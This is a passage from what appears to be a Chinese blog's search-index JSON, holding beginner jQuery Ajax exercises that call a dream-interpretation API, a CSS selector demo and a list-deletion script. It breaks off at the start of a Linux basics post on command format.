class=\"name\">style</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;container&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;keyword&quot;</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;text&quot;</span> <span class=\"attr\">placeholder</span>=<span class=\"string\">&quot;请输入关键词&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;search&quot;</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;button&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;查询&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">hr</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">p</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;result&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;../js/jquery-3.6.0.min.js&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t$(<span class=\"keyword\">function</span>(<span class=\"params\"></span>) &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t$(<span class=\"string\">&quot;#search&quot;</span>).<span class=\"title function_\">on</span>(<span class=\"string\">&quot;click&quot;</span>, <span class=\"keyword\">function</span>(<span class=\"params\"></span>) &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t<span class=\"keyword\">var</span> keyword = $(<span class=\"string\">&quot;#keyword&quot;</span>).<span class=\"title function_\">val</span>().<span class=\"title function_\">trim</span>()</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t<span class=\"keyword\">if</span> (keyword.<span class=\"property\">length</span> &gt; <span class=\"number\">0</span>) &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t<span class=\"keyword\">var</span> url = <span class=\"string\">&#x27;http://api.tianapi.com/txapi/dream/index&#x27;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t$.<span class=\"title function_\">ajax</span>(&#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t\t<span class=\"string\">&quot;url&quot;</span>: url,</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t\t<span class=\"string\">&quot;type&quot;</span>: <span class=\"string\">&quot;get&quot;</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t\t<span class=\"string\">&quot;data&quot;</span>: &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t\t\t<span class=\"string\">&quot;key&quot;</span>: <span class=\"string\">&quot;843c2619fa9c643f9bcfe0ee2e66b9da&quot;</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t\t\t<span class=\"string\">&quot;num&quot;</span>: <span class=\"string\">&quot;5&quot;</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t\t\t<span class=\"string\">&quot;word&quot;</span>: keyword,</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t\t&#125;,</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t\t<span class=\"string\">&quot;dataType&quot;</span>: <span class=\"string\">&quot;json&quot;</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t\t<span class=\"string\">&quot;success&quot;</span>: <span class=\"keyword\">function</span>(<span class=\"params\">jsonObj</span>) &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t\t\t<span class=\"keyword\">if</span> (jsonObj.<span class=\"property\">code</span> == <span class=\"number\">250</span>) &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t\t\t\t$(<span class=\"string\">&quot;#result&quot;</span>).<span class=\"title function_\">text</span>(jsonObj.<span class=\"property\">msg</span>);</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t\t\t&#125; <span class=\"keyword\">else</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t\t\t\t$(<span class=\"string\">&quot;#result&quot;</span>).<span class=\"title function_\">html</span>(jsonObj.<span class=\"property\">newslist</span>[<span class=\"number\">0</span>].<span class=\"property\">result</span>);</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t&#125;)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t&#125;)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t&#125;)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"jQuery的Ajax请求-Practice周公解梦-html\"><a href=\"#jQuery的Ajax请求-Practice周公解梦-html\" class=\"headerlink\" title=\"jQuery的Ajax请求 - Practice周公解梦.html\"></a>jQuery的Ajax请求 - Practice周公解梦.html</h1><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;utf-8&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>周公解梦<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span><span class=\"language-css\"></span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-class\">.a</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">color</span>: aquamarine;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">font-family</span>: <span class=\"string\">&quot;bodoni mt&quot;</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">font-size</span>: <span class=\"number\">10px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-id\">#insert</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">margin-top</span>: <span class=\"number\">12%</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">margin-left</span>: <span class=\"number\">38%</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"comment\">/* position: absolute;</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-css\">\t\t\t\ttop:30%;</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-css\">\t\t\t\tleft:50%;</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-css\">\t\t\t\ttransform: translate(-50%,-50%); */</span></span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\thr &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">margin-top</span>: <span class=\"number\">1%</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-id\">#dream</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">width</span>: <span class=\"number\">400px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">margin-top</span>: <span class=\"number\">1%</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">margin-left</span>: <span class=\"number\">35%</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"comment\">/* height: 20px; */</span></span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"comment\">/* position: absolute;</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-css\">\t\t\t\ttop:70%;</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-css\">\t\t\t\tleft:50%;</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-css\">\t\t\t\ttransform: translate(-50%,-50%); */</span></span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"comment\">/* width: 500px; */</span></span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"comment\">/* text-align:center;</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-css\">\t\t\t\tmargin:0 auto;</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-css\">\t\t\t\tline-height:200px; */</span></span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-id\">#insert</span>&gt;<span class=\"selector-tag\">input</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">border</span>: none;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">outline</span>: none;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">font-size</span>: <span class=\"number\">18px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">overflow</span>: auto;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-id\">#insert</span>&gt;<span class=\"selector-tag\">input</span><span class=\"selector-attr\">[type=text]</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">border-bottom</span>: <span class=\"number\">1px</span> solid darkgray;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">width</span>: <span class=\"number\">200px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">height</span>: <span class=\"number\">50px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">text-align</span>: center;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-id\">#insert</span>&gt;<span class=\"selector-tag\">input</span><span class=\"selector-attr\">[type=button]</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">width</span>: <span class=\"number\">80px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">height</span>: <span class=\"number\">30px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">background-color</span>: coral;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">color</span>: white;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">vertical-align</span>: bottom;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">cursor</span>: pointer;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t</span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;insert&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;text&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;keywords&quot;</span> <span class=\"attr\">placeholder</span>=<span class=\"string\">&quot;请输入关键词&quot;</span> <span class=\"attr\">required</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;ok&quot;</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;button&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;查询&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">HR</span> <span class=\"attr\">align</span>=<span class=\"string\">center</span> <span class=\"attr\">color</span>=<span class=\"string\">#987cb9</span> <span class=\"attr\">SIZE</span>=<span class=\"string\">1</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;dream&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t</span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;../js/jquery-3.6.0.min.js&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t$(() =&gt; &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t<span class=\"keyword\">const</span> url = <span class=\"string\">&#x27;http://api.tianapi.com/txapi/dream/index&#x27;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t$(<span class=\"string\">&#x27;#ok&#x27;</span>).<span class=\"title function_\">on</span>(<span class=\"string\">&#x27;click&#x27;</span>, <span class=\"function\">(<span class=\"params\">evt</span>) =&gt;</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t$(<span class=\"string\">&#x27;#dream&gt;p&#x27;</span>).<span class=\"title function_\">remove</span>()</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t<span class=\"keyword\">let</span> input = $(<span class=\"string\">&#x27;#ok&#x27;</span>).<span class=\"title function_\">prev</span>();</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t<span class=\"keyword\">let</span> word = input.<span class=\"title function_\">val</span>().<span class=\"title function_\">trim</span>()</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t<span class=\"keyword\">let</span> data = &#123;<span class=\"string\">&quot;key&quot;</span>: <span class=\"string\">&quot;843c2619fa9c643f9bcfe0ee2e66b9da&quot;</span>, <span class=\"string\">&quot;num&quot;</span>: <span class=\"string\">&quot;5&quot;</span>, <span class=\"string\">&quot;word&quot;</span>: word&#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t<span class=\"comment\">// $对象的getJSON方法可以执行异步请求(get请求)获得服务器返回的JSON格式的数据</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t<span class=\"comment\">// 第一个参数是请求的URL(统一资源定位符)</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t<span class=\"comment\">// 第二个参数是要发送给服务器的数据(JSON格式)，如果没有数据发给服务器可以省略不写</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t<span class=\"comment\">// 第三个参数是请求成功服务器返回数据之后要执行的回调函数，其参数为服务器返回的内容处理后的JSON</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t<span class=\"comment\">// $.getJSON(url, data, (json) =&gt; &#123; </span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t<span class=\"comment\">// \tjson.newslist.forEach((verbo) =&gt; &#123;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t<span class=\"comment\">// \t\t// $(&#x27;#poetry&#x27;).append($(&#x27;&lt;p&gt;&#x27;).text(verbo.content))</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t<span class=\"comment\">// \t\t// attr(&#x27;src&#x27;, &#x27;xxx&#x27;) 添加属性</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t<span class=\"comment\">// \t\t$(&#x27;#poetry&#x27;).prepend($(&#x27;&lt;p&gt;&#x27;).text(verbo.content).attr(&#x27;class&#x27;, &#x27;a&#x27;))</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t<span class=\"comment\">// \t&#125;)</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t<span class=\"comment\">// &#125;)</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t<span class=\"keyword\">if</span> (word) &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t$.<span class=\"title function_\">ajax</span>(&#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t\t<span class=\"string\">&quot;url&quot;</span>: url,</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t\t<span class=\"string\">&quot;type&quot;</span>: <span class=\"string\">&quot;get&quot;</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t\t<span class=\"string\">&quot;data&quot;</span>: data,</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t\t<span class=\"string\">&quot;dataType&quot;</span>: <span class=\"string\">&quot;json&quot;</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t\t<span class=\"string\">&quot;headers&quot;</span>: &#123;&#125;,</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t\t<span class=\"string\">&quot;success&quot;</span>: <span class=\"function\">(<span class=\"params\">json</span>) =&gt;</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t\t\t<span class=\"keyword\">if</span> (json.<span class=\"property\">newslist</span>) &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t\t\t\tjson.<span class=\"property\">newslist</span>.<span class=\"title function_\">forEach</span>(<span class=\"function\">(<span class=\"params\">verbo</span>) =&gt;</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t\t\t\t\t$(<span class=\"string\">&#x27;#dream&#x27;</span>).<span class=\"title function_\">prepend</span>($(<span class=\"string\">&#x27;&lt;p&gt;&#x27;</span>).<span class=\"title function_\">html</span>(verbo.<span class=\"property\">result</span>).<span class=\"title function_\">attr</span>(<span class=\"string\">&#x27;class&#x27;</span>, <span class=\"string\">&#x27;a&#x27;</span>))</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t\t\t\t&#125;)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t\t\t&#125; <span class=\"keyword\">else</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t\t\t\t$(<span class=\"string\">&#x27;#dream&#x27;</span>).<span class=\"title function_\">prepend</span>($(<span class=\"string\">&#x27;&lt;p&gt;&#x27;</span>).<span class=\"title function_\">text</span>(<span class=\"string\">&#x27;未检索到相关信息&#x27;</span>).<span class=\"title function_\">attr</span>(<span class=\"string\">&#x27;class&#x27;</span>, <span class=\"string\">&#x27;a&#x27;</span>))</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t\t\t</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t\t&#125;,</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t\t<span class=\"string\">&quot;error&quot;</span>: <span class=\"function\">(<span class=\"params\">error</span>) =&gt;</span> &#123;&#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t&#125;)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\tinput.<span class=\"title function_\">val</span>(<span class=\"string\">&#x27;&#x27;</span>).<span class=\"title function_\">get</span>(<span class=\"number\">0</span>).<span class=\"title function_\">focus</span>()</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t&#125;)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t&#125;)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"style-css\"><a href=\"#style-css\" class=\"headerlink\" title=\"style.css\"></a>style.css</h1><figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* 通配符选择器 */</span></span><br><span class=\"line\">* &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">margin</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">padding</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* 标签选择器 */</span></span><br><span class=\"line\"><span class=\"selector-tag\">h1</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">width</span>: <span class=\"number\">960px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">height</span>: <span class=\"number\">40px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">margin</span>: <span class=\"number\">5</span> auto; <span class=\"comment\">/* 边距 */</span></span><br><span class=\"line\">\t<span class=\"comment\">/* text-align: center;  文本对齐方式: 居中 */</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">/* 类选择器 */</span></span><br><span class=\"line\"><span class=\"selector-class\">.a</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">background-color</span>: red;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.b</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">background-color</span>: orange;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.c</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">background-color</span>: yellow;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.d</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">background-color</span>: green;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.e</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">background-color</span>: cyan;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.f</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">background-color</span>: blue;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.g</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">background-color</span>: purple;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.h</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">color</span>: chartreuse;</span><br><span class=\"line\">\t<span class=\"attribute\">text-align</span>: center;</span><br><span class=\"line\">\t<span class=\"attribute\">width</span>: <span class=\"number\">100px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">height</span>: <span class=\"number\">38px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">overflow</span>: scroll; <span class=\"comment\">/* hidden */</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.big</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">font-size</span>: <span class=\"number\">32px</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.normal</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">font-size</span>: <span class=\"number\">18px</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.small</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">font-size</span>: <span class=\"number\">12px</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">/* ID选择器 */</span> <span class=\"comment\">/*多个标签需使用同一样式属性，ID也应不同且一一对应 */</span></span><br><span class=\"line\"><span class=\"selector-id\">#header</span>, <span class=\"selector-id\">#footer</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">width</span>: <span class=\"number\">800px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">height</span>: <span class=\"number\">120px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">border</span>: <span class=\"number\">1px</span> solid red;</span><br><span class=\"line\">\t<span class=\"attribute\">margin</span>: <span class=\"number\">10px</span> auto;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"动态列表效果-js\"><a href=\"#动态列表效果-js\" class=\"headerlink\" title=\"动态列表效果.js\"></a>动态列表效果.js</h1><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> ul = <span class=\"variable language_\">document</span>.<span class=\"title function_\">querySelector</span>(<span class=\"string\">&#x27;#fruits&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">var</span> anchors = <span class=\"variable language_\">document</span>.<span class=\"title function_\">querySelectorAll</span>(<span class=\"string\">&#x27;#fruits&gt;li&gt;a&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; anchors.<span class=\"property\">length</span>; i += <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">\tanchors[i].<span class=\"title function_\">addEventListener</span>(<span class=\"string\">&#x27;click&#x27;</span>, <span class=\"function\">(<span class=\"params\">evt</span>) =&gt;</span> &#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">// 事件对象的preventDefault方法可以阻止事件的默认行为</span></span><br><span class=\"line\">\t\tevt.<span class=\"title function_\">preventDefault</span>()</span><br><span class=\"line\">\t\tul.<span class=\"title function_\">removeChild</span>(anchors[i].<span class=\"property\">parentNode</span>)</span><br><span class=\"line\">\t&#125;)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// anchors.forEach(delAnchor =&gt; &#123;</span></span><br><span class=\"line\"><span class=\"comment\">// \tdelAnchor.addEventListener(&#x27;click&#x27;, () =&gt; &#123;</span></span><br><span class=\"line\"><span class=\"comment\">// \t\t// 通过父标签的removeChild方法可以删除子标签</span></span><br><span class=\"line\"><span class=\"comment\">// \t\tul.removeChild(delAnchor.parentNode)</span></span><br><span class=\"line\"><span class=\"comment\">// \t&#125;)</span></span><br><span class=\"line\"><span class=\"comment\">// &#125;)</span></span><br></pre></td></tr></table></figure>\n","categories":["HTML"],"tags":["基础"]},{"title":"linux基础","url":"/2022/08/17/Linux%E5%9F%BA%E7%A1%80/","content":"<h1 id=\"1-Linux命令格式\"><a href=\"#1-Linux命令格式\" class=\"headerlink\" title=\"1.Linux命令格式\"></a>1.Linux命令格式</h1><p>命令名称 [命名参数] [命名对象]</p>\n<h2 id=\"（1）获取登录信息-w-who-last\"><a href=\"#（1）获取登录信息-w-who-last\" class=\"headerlink\" title=\"（1）获取登录信息-w/who/last\"></a>（1）获取登录信息-w/who/last</h2><p>who am i – 